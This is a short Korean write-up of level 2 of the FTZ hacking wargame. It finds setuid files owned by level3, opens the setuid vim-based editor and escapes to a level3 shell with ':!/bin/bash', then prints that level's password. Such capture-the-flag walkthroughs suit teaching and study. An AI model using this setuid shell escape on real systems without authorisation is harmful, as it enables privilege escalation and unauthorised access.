## level2

#### 실행

``` //
[level2@ftz level2]$cat hint // hint 파일의 내용을 화면에 출력한다.
```

#### 결과

```
텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...
```

--------

#### 실행

```
[level2@ftz level2]$find / -user level3 -perm -4000 2>/dev/null // 루트 디렉토리부터 level3 소유의 최소 setUID가 설정되어 있는 파일을 찾고 표준 에러를 휴지통으로 리다이렉트한다.
```

#### 결과

```/bin/ExceteMe
/usr/bin/editor
```

---------

#### 실행

```
[level2@ftz level2]$ cd /usr/bin
[level2@ftz bin]$ ./editor //editor 실행
```

#### 결과

```
vim 실행 화면 출력
```

-------------------

#### 실행

```
(Shift key)+:!/bin/bash // 쉘 실행
```

vim에서 쉘로 빠져나가지 않고도 !를 이용해 외부명령어를 실행시킬 수 있다.

#### 결과

```
[level3@ftz bin]$
```

--------

#### 실행

```
[level3@ftz bin]$ my-pass
```

#### 결과

```
Level3 Password is "can you fly?"
```

